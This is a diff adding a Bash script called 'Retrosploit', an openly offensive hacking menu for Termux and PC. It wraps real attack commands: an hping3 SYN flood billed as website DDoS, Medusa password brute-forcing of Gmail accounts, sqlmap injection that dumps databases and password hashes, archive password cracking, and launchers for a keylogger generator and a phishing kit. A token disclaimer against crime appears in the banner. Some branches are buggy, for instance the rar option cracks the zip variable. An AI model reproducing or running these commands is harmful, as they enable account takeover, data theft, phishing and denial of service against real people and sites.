@@ -1,0 +1,612 @@
+#!/bin/bash
+
+#=========================#
+#     Colors module       #
+#=========================#
+
+def="\e[1;"
+white="${def}97m"
+red="${def}91m"
+cyan="${def}96m"
+magenta="${def}95m"
+green="${def}92m"
+yellow="${def}93m"
+reset="${def}39m"
+blink="${def}5m"
+Hidden="${def}8m"
+under="${def}4m"
+blinkre="${def}25m"
+rehide="${def}28m"
+pc="${yellow}[${red}PC Only${yellow}]${green}"
+
+#===================#
+#  ROOT PRIVILEGIES #
+#===================#
+
+#if [[ $EUID -ne 0 ]]; then
+#        echo -e "$red You don't have Root privilegies, execute the script as root.$nc"
+#        exit 1
+#fi
+
+#=============================#
+#   Get gateway and local ip  #
+#=============================#
+
+gate=`netstat -r | grep "default" | awk {'print $8'}`
+llp=`hostname -I | cut -d' ' -f1`
+public=`curl ifconfig.me 2>&-`
+
+version="1.0"
+auth="Retr0"
+mac=`</sys/class/net/wlan0/address`
+logo=`figlet Retrosploit | lolcat`
+
+#=========== END MODULES ============#
+
+check_module() {
+echo -e $cyan && clear && sleep 0.5
+
+if [ -d ~/Retrosploit_Termux/functions ] && [ -d ~/Retrosploit_Termux/output ]; then
+sleep 0.8
+else
+mkdir ~/Retrosploit_Termux/functions && mkdir ~/Retrosploit_Termux/output
+fi
+
+if [ -v "$(command -v msfconsole)" ] && [ -v "$(command -v zip)" ] && [ -v "$(command -v sqlmap)" ] && [ -v "$(command -v hydra)" ] && [ -v "$(command -v crunch)" ] && [ -v "$(command -v figlet)" ] && [ -v "$(command -v lolcat)" ]; then
+
+echo -e $cyan":: [ ${blink}Checking Modules...${blinkre} ] ::\n" && sleep 1.8 && echo -e $cyan "Modules installed completed!!" && logo
+
+else
+
+echo -e $cyan":: [ ${blink}Checking Modules...${blinkre} ] ::\n" && sleep 0.8 && apt-get update && apt-get full-upgrade -y && pkg install coreutils dnsutils hydra metasploit zip crunch sqlmap nmap figlet ruby python -y && gem install lolcat && apt-get update && apt-get full-upgrade -y && bash retrosploit_termux
+
+fi
+
+}
+
+logo(){
+
+echo -e "$logo"
+
+echo -e $reset"\n   [+]_̳_̳_̳_̳_̳_̳_̳_̳ [ Version: $version Author: $auth ] _̳_̳_̳_̳_̳_̳_̳_̳[+]\n"      
+
+echo -e $red":: ${cyan}Description ${red}::\n"
+
+echo -e $yellow"This tools have many function to use. But you need to remember something.
+Do not make the crime with this tools. I will not be responsible in all cases 
+if you do something illegal.$reset"
+
+}
+
+main_module() {
+
+echo -e $green"Please type 'help' to open menu\n${cyan}"
+
+read -p "retrosploit:> " menu
+
+if [ $menu == "help" ]; then
+
+help_module && sleep 1.3 && main_module
+
+elif [ $menu == "scan" ]; then
+sleep 0.5
+if [ -d /sys/class/net/eth0 ]; then
+scan_module
+else
+echo -e $red"This function is not work for termux. You should use pc for this." && sleep 0.8 && main_module
+fi
+
+elif [ $menu == "sql" ]; then
+sleep 0.1
+sql_module
+
+elif [ $menu == "brute" ]; then
+sleep 0.1
+brute_module
+
+elif [ $menu == "other" ]; then
+sleep 0.1
+other_module
+
+elif [ $menu == "keylogger" ]; then
+
+cd ~/Retrosploit/functions/sAINT && java -jar sAINT.jar && sleep 0.8 && back_module
+
+elif [ $menu == "credit" ]; then
+sleep 0.1
+
+echo -e $red":: ${cyan}Credits ${red}::\n"
+
+echo -e $reset"Me	-	Retrosploit"
+sleep 0.8
+echo -e "Sqlmapproject	-	Sqlmap"
+sleep 0.8
+echo -e "Tuhinshubhra 	-	Red Hawk"
+sleep 0.8
+echo -e "magnumripper 	-	John The Ripper"
+sleep 0.8
+echo -e "vanhauser-thc 	-	Hydra-thc"
+sleep 0.8
+echo -e "Unknown 	-	Medusa"
+sleep 0.8
+echo -e "tiagorlampert	-	sAINT"
+sleep 0.8
+echo -e "DarkSecDevelopers	-	HiddenEye\n"
+sleep 0.8
+main_module
+
+elif [ $menu == "clear" ]; then
+sleep 0.3
+clear && logo && main_module
+
+elif [ $menu == "tor" ]; then
+sleep 0.3
+
+if [ -d /sys/class/net/eth0 ]; then
+
+sleep 0.3
+tor_module
+
+else
+sleep 0.3
+echo -e $red"This function is not work for termux. You should use pc for this." && sleep 0.8 && main_module
+
+fi
+
+elif [ $menu == "exit" ]; then
+sleep 0.3
+clear && echo -e $yellow"Good bye bud. Have fun :)\n"
+exit
+
+else
+exit 
+fi
+}
+
+scan_module() {
+echo
+echo -e $reset"Turn off your tor service before use this function"
+
+echo -e $cyan" _____________________________________________
+|___________________Commands__________________|
+|                      |                      |
+|         help         |       Open menu      |
+|         sport        |   Scan single port   |
+|         lscan        |   Scan local network |
+|         rdp          |   Scan vuln-ms12-020 |
+|         dos          |       Dos target     |
+|         fwbypass     |     Bypass firewall  |
+|         hbrute       |     Brute http pwd   |
+|         cookie       |       Show credit    |
+|         sip          |   Show connected ips |
+|         whois        |     Show whois data  |
+|         rhawk        |       Use Red-Hawk   |
+|         back         |       Back to main   |
+|______________________|______________________|\n"
+
+read -p "retrosploit >> scan :> " menu
+
+if [ $menu == "help" ]; then
+
+scan_module
+
+elif [ $menu == "sport" ]; then
+
+read -p "retrosploit >> sport >> ip :> " target
+read -p "retrosploit >> sport >> port :> " port
+
+nmap -p $port $target
+
+back_module
+
+elif [ $menu == "rdp" ]; then
+
+read -p "retrosploit >> rdp >> ip :> " target
+
+nmap -sV --script=rdp-vuln-ms12-020 -p 3389 -Pn $target
+
+back_module
+
+elif [ $menu == "dos" ]; then
+
+echo -e "This function can be only ddos attack website\n"
+
+read -p "retrosploit >> dos >> ip :> " target
+read -p "retrosploit >> dos >> count :> " count
+
+hping3 -S $target -c $count -p ++1 --flood -q
+
+back_module
+
+elif [ $menu == "fwbypass" ]; then
+
+echo -e $reset"Unfiltered - Firewall disabled"
+echo -e "Filtered - Firewall Enabled\n"
+
+read -p "retrosploit >> fwbypass >> ip :> " target
+
+nmap -sA $target
+
+back_module
+
+elif [ $menu == "hbrute" ]; then
+
+read -p "retrosploit >> hbrute >> ip :> " target
+
+nmap --script http-form-brute -p 80 $target
+nmap --script http-brute -p 80 $target
+
+back_module
+
+elif [ $menu == "cookie" ]; then
+
+read -p "retrosploit >> cookie >> ip :> " target
+
+back_module
+
+elif [ $menu == "lscan" ]; then
+
+read -p "retrosploit >> lscan >> ip :> " target
+
+nmap -sP $target/24
+sleep 0.5
+
+back_module
+
+elif [ $menu == "sip" ]; then
+
+read -p "retrosploit >> sip >> your router ip :> " target
+
+nmap -sP $target/24 | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}'
+back_module
+
+elif [ $menu == "rhawk" ]; then
+
+php ~/Retrosploit/functions/RED_HAWK/rhawk.php && sleep 0.8 && main_module
+
+elif [ $menu == "back" ]; then
+
+sleep 0.3
+main_module
+exit
+
+else
+exit
+
+fi
+
+}
+
+back_module() {
+
+echo -e $reset
+read -p "Do you want to go back to main menu? [Y/n]:> " back
+
+if [ $back == "Y" ] || [ $back == "y" ]; then
+
+clear && sleep 1 && logo && main_module
+
+elif [ $back == "N" ] || [ $back == "n" ]; then
+
+sleep 0.3
+clear && echo -e $yellow"Good bye bud :)\n"
+exit
+
+else
+
+exit
+
+fi
+
+}
+
+help_module() {
+
+echo -e $green" _____________________________________________
+|___________________Commands__________________|
+|                      |                      |
+|         help         |       Open menu      |
+|     scan $pc   |       Scan menu      |
+|         brute        |    Brute force menu  |
+|         sql          |   Sql Injection menu |
+|      tor $pc   |     Tor switch menu  |
+|         credit       |       Show credit    |
+|         clear        |     Clear terminal   |
+|         keylogger    |   Generate keylogger |
+|         other        |     Other functions  |
+|         exit         |    Exit the program  |
+|______________________|______________________|\n"
+
+}
+
+other_module() {
+
+echo -e $yellow" _____________________________________________
+|___________________Commands__________________|
+|                      |                      |
+|         help         |       Open menu      |
+|  phishing $pc$yellow  |     Use pishing page |
+|         back         |       Back to main   |
+|______________________|______________________|\n$cyan"
+
+echo -e $green"Please type 'help' to open menu\n${cyan}"
+
+read -p "retrosploit >> other :> " menu
+
+if [ $menu == "help" ]; then
+
+other_module
+
+elif [ -d ~/Retrosploit/functions/HiddenEye ]; then
+sleep 0.1
+
+echo -e $red"This function is not work for termux. You should use pc for this." && sleep 0.8 && main_module
+
+else
+
+cd ~/Retrosploit/functions/HiddenEye && python3 HiddenEye.py && sleep 0.8 && main_module
+
+fi
+
+}
+
+
+brute_module() {
+
+echo -e $red" _____________________________________________
+|___________________Commands__________________|
+|                      |                      |
+|         help         |       Open menu      |
+|         zip          |   Crack zip file pwd |
+|         rar          |   Crack rar file pwd |
+|         gmail        |   Brute force gmail  |
+|         clear        |     Clear terminal   |
+|         back         |       Back to main   |
+|______________________|______________________|\n$cyan"
+
+echo -e $green"Please type 'help' to open menu\n${cyan}"
+
+read -p "retrosploit >> brute force :> " switch
+
+if [ $switch == "help" ]; then
+
+brute_module
+
+elif [ $switch == "zip" ]; then
+
+read -p "retrosploit >> brute >> zip >> output file :> " hash
+sleep 0.5
+read -p "retrosploit >> brute >> zip >> output file >> zip file :> " zip
+sleep 0.5
+read -p "retrosploit >> lscan >> zip >> output file >> zip file >> wordlist location :> " wordlist
+sleep 0.5
+zip2john $zip > $hash
+sleep 0.5
+john --format=ZIP $hash --wordlist=$wordlist
+sleep 0.5
+read -p "retrosploit >> lscan >> zip >> output file >> zip file >> wordlist location >> unzip? :> " unzip
+read -p "retrosploit >> lscan >> zip >> output file >> zip file >> wordlist location >> unzip >> password :> " pwd
+
+if [ $unzip == "y" ] || [ $unzip == "Y" ]; then
+
+unzip -P $pwd $zip
+
+elif [ $unzip == "n" ] || [ $unzip == "N" ]; then
+
+sleep 0.5
+back_module
+
+else
+
+sleep 0.3
+main_module
+
+fi
+
+elif [ $switch == "rar" ]; then
+
+read -p "retrosploit >> brute >> rar >> output file :> " hash
+sleep 0.5
+read -p "retrosploit >> brute >> rar >> hash >> rar file :> " rar
+sleep 0.5
+read -p "retrosploit >> lscan >> rar >> output file >> rar file >> wordlist location :> " wordlist
+sleep 0.5
+zip2john $zip > $hash
+sleep 0.5
+john --format=ZIP $hash --wordlist=$wordlist
+sleep 0.5
+read -p "retrosploit >> lscan >> rar >> output file >> rar file >> wordlist location >> unrar? :> " unzip
+read -p "retrosploit >> lscan >> rar >> output file >> rar file >> wordlist location >> unrar >> password :> " pwd
+
+if [ $unzip == "y" ] || [ $unzip == "Y" ]; then
+
+unzip -P $pwd $zip
+
+elif [ $unzip == "n" ] || [ $unzip == "N" ]; then
+
+sleep 0.5
+back_module
+
+else
+
+sleep 0.3
+main_module
+
+fi
+
+elif [ $switch == "gmail" ]; then
+sleep 0.1
+
+read -p "retrosploit >> brute >> gmail >> single or multi :>  " choose
+
+if [ $choose == "single" ]; then
+
+read -p "retrosploit >> brute >> gmail >> single >> target's gmail :> " target
+sleep 0.5
+read -p "retrosploit >> brute >> gmail >> single >> wordlist location :> " wordlist
+sleep 0.5
+medusa -h smtp.gmail.com -u $target -P $wordlist -M smtp
+sleep 0.5
+back_module
+
+elif [ $choose == "multi" ]; then
+
+read -p "retrosploit >> brute >> gmail >> multi >> gmaillist location :> " glist
+sleep 0.5
+read -p "retrosploit >> brute >>  gmail >> multi >> wordlist location :> " wordlist
+sleep 0.5
+medusa -h smtp.gmail.com -U $glist -P $wordlist -M smtp
+sleep 0.5
+back_module
+
+else
+sleep 0.8
+main_module
+
+fi
+
+elif [ $switch == "clear" ]; then
+sleep 0.1
+clear
+brute_module
+
+elif [ $switch == "back" ]; then
+sleep 0.3
+main_module
+
+else
+
+echo -e "Command not found, Back to main menu"
+sleep 0.8
+main_module
+
+fi
+
+}
+
+sql_module() {
+
+echo -e $cyan" _____________________________________________
+|___________________Commands__________________|
+|                      |                      |
+|         help         |       Open menu      |
+|         ssql         | Inject sql vuln site |
+|         dork         |  Scan site with dork |
+|         dbuser       |    Get current user  |
+|         dbpwd        |    Get current pwd   |
+|         all          |     Dump everything  |
+|         clear        |     Clear terminal   |
+|         back         |       Back to main   |
+|______________________|______________________|\n$cyan"
+
+read -p "retrosploit >> sql :> " switch
+
+if [ $switch == "help" ]; then
+help_module
+
+elif [ $switch == "ssql" ]; then
+
+read -p "retrosploit >> sql >> target's site :> " target
+sqlmap -u $target --dbs --batch --output-dir=~/Retrosploit/output/
+sleep 0.5
+read -p "retrosploit >> sql >> target >> tables :> " tables
+sqlmap -u $target -D $tables --tables --batch --output-dir=~/Retrosploit/output/
+sleep 0.5
+read -p "retrosploit >> sql >> target >> tables >> columns :> " columns
+sqlmap -u $target --columns -D $tables -T $columns --batch --output-dir=~/Retrosploit/output/
+sleep 0.5
+read -p "retrosploit >> sql >> target >> tables >> columns >> dump :> " dump
+
+if [ $dump == "y" ] || [ $dump == "Y" ]; then
+sqlmap -u $target --dump -D $tables -T $columns --batch --output-dir=~/Retrosploit/output/
+sleep 0.5
+back_module
+
+elif [ $dump == "n" ] || [ $dump == "N" ]; then
+sleep 0.5
+back_module
+
+else
+echo -e "Command not found, Back to main menu"
+sleep 0.8
+main_module
+fi
+
+elif [ $switch == "dork" ]; then
+sleep 0.1
+read -p "retrosploit >> sql >> dork :> " dork
+
+sqlmap -g $dork --batch
+
+elif [ $switch == "dbuser" ]; then
+sleep 0.1
+read -p "retrosploit >> sql >> target's site :> " target
+sqlmap -u $target --users --batch --output-dir=~/Retrosploit/output/
+sleep 0.5
+back_module
+
+elif [ $switch == "dbpwd" ]; then
+sleep 0.1
+read -p "retrosploit >> sql >> target's site :> " target
+sqlmap -u $target --passwords --batch --output-dir=~/Retrosploit/output/
+sleep 0.5
+back_module
+
+elif [ $switch == "all" ]; then
+read -p "retrosploit >> sql >> target's site :> " target
+
+sqlmap -u $target -a --batch
+sleep 0.5
+back_module
+
+elif [ $switch == "clear" ]; then
+clear
+
+elif [ $switch == "back" ]; then
+sleep 0.3
+main_module
+
+else
+echo -e "Command not found, Back to main menu"
+sleep 0.8
+main_module
+
+fi
+
+}
+
+tor_module(){
+
+echo -e $yellow" _____________________________________________
+|___________________Commands__________________|
+|                      |                      |
+|         on           |       Turn on tor    |
+|         off          |       Turn off tor   |
+|         reset        |    Reset tor service |
+|         back         |       Back to main   |
+|______________________|______________________|\n$cyan"
+
+read -p "retrosploit >> tor :> " switch
+
+if [ $switch == "on" ] || [ $switch == "ON" ]; then
+kalitorify -t && main_module
+
+elif [ $switch == "off" ] || [ $switch == "OFF" ]; then
+kalitorify -c && main_module
+
+elif [ $switch == "Reset" ] || [ $switch == "reset" ]; then
+
+kalitorify -r && main_module
+
+elif [ $switch == "back" ] || [ $switch == "Back" ]; then
+clear && logo && main_module
+
+else
+exit
+
+fi
+
+}
+
+check_module
+
